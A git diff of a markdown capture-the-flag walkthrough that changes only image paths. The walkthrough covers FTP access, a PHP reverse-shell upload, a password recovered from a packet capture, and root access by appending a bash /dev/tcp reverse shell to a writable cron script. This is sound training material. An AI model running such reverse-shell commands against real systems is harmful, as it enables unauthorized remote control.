@@ -9,7 +9,7 @@ sticker: emoji//1f336-fe0f
 
 Let's begin with a simple Nmap scan:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023164431.png)
+![](cybersecurity/images/Pasted%2520image%252020241023164431.png)
 
 ```ad-hint
 OPEN PORTS:
@@ -21,58 +21,58 @@ OPEN PORTS:
 
 Let's log in FTP since anonymous login is allowed:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023164907.png)
+![](cybersecurity/images/Pasted%2520image%252020241023164907.png)
 
 We found this files, let's download them all using `mget *`
 
 Let's read `notice.txt`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165101.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165101.png)
 
 Seems like `maya` could be an user for ssh
 
 If we try to use `steghide` in the important.jpg we get this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165247.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165247.png)
 Let's try to change the hex for the file into a jpg, and try again:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165422.png)
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165648.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165422.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165648.png)
 
 Couldn't get anything useful, so, let's start with the web fuzzing and enumeration
 ## FUZZING
 
 Using FFUF to fuzz the website, I found this directory:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023164544.png)
+![](cybersecurity/images/Pasted%2520image%252020241023164544.png)
 
 Let's visit the website and try to enumerate it further: 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165753.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165753.png)
 ## SOURCE CODE
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165822.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165822.png)
 # EXPLOITATION
 
 
 ## FILES DIRECTORY
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023165853.png)
+![](cybersecurity/images/Pasted%2520image%252020241023165853.png)
 
 Seems like we could exploit the ftp to upload files into the server, we could try uploading a [[MOST COMMON REVERSE SHELLS|reverse shell]] for this CTF, I uploaded a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023174700.png)
+![](cybersecurity/images/Pasted%2520image%252020241023174700.png)
 
 Nice, let's send the reverse shell and get our connection:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023174758.png)
+![](cybersecurity/images/Pasted%2520image%252020241023174758.png)
 
 Once I established the connection, I stabilized my shell using the [[STABLE SHELL|stable shell tricks]]
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023174947.png)
+![](cybersecurity/images/Pasted%2520image%252020241023174947.png)
 
 Nice, now we have an stable shell, let's get our flags and escalate privileges.
 
@@ -81,11 +81,11 @@ Nice, now we have an stable shell, let's get our flags and escalate privileges.
 
 Before trying to escalate privileges, we are able to read the recipe.txt file and it says this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023175629.png)
+![](cybersecurity/images/Pasted%2520image%252020241023175629.png)
 
 So, we got our first answer, let's try to read the home directory:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023175658.png)
+![](cybersecurity/images/Pasted%2520image%252020241023175658.png)
 
 
 If we try to `cd` to Lennie home, permission is denied, but now, we can try other escalation vectors, for example, if we use linpeas, we are able to see we have 2 suspicious folder in root:
@@ -97,21 +97,21 @@ If we try to `cd` to Lennie home, permission is denied, but now, we can try othe
 
 Let's read the contents of both files:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023180403.png)
+![](cybersecurity/images/Pasted%2520image%252020241023180403.png)
 
 We got a `.pcapng` file, we can analyze it with wireshark, let's copy it to `/var/www/html/files/ftp` and download it to our machine:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023180944.png)
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023180951.png)
+![](cybersecurity/images/Pasted%2520image%252020241023180944.png)
+![](cybersecurity/images/Pasted%2520image%252020241023180951.png)
 
 
 Now that we filtered tcp in wireshark, we can follow the tcp stream for the following:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023182634.png)
+![](cybersecurity/images/Pasted%2520image%252020241023182634.png)
 
 If we follow the stream, we are able to see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023182732.png)
+![](cybersecurity/images/Pasted%2520image%252020241023182732.png)
 
 Seems like we got the password for Lennie:
 
@@ -119,17 +119,17 @@ Seems like we got the password for Lennie:
 `lennie:c4ntg3t3n0ughsp1c3`
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023182848.png)
+![](cybersecurity/images/Pasted%2520image%252020241023182848.png)
 We are in, now, we are able to read the `user.txt`
 
 If we try `sudo -l`, lennie may not run sudo on startup, let's use the other techniques from [[BASIC PRIVESC IN LINUX|linux privesc]]
 
 After trying all that, nothing useful came, but, in the lennie home, we found a useful directory called `/scripts` 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023183424.png)
+![](cybersecurity/images/Pasted%2520image%252020241023183424.png)
 I found a planner.sh and startup_list.txt, second file did not have anything useful, but first file, had this:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023183735.png)
+![](cybersecurity/images/Pasted%2520image%252020241023183735.png)
 
 A `/etc/print.sh` file, we can write on it, let's write a reverse shell on it:
 
@@ -139,11 +139,11 @@ shell: `echo "/bin/bash -i >& /dev/tcp/10.6.34.159/1234 0>&1" >> /etc/print.sh`
 
 Since planner.sh runs every minute, we only need to wait a minute with out netcat set on to get the shell:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023184044.png)
+![](cybersecurity/images/Pasted%2520image%252020241023184044.png)
 
 And just like that, we finished the machine:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241023184153.png)
+![](cybersecurity/images/Pasted%2520image%252020241023184153.png)
 
 Gg!
 
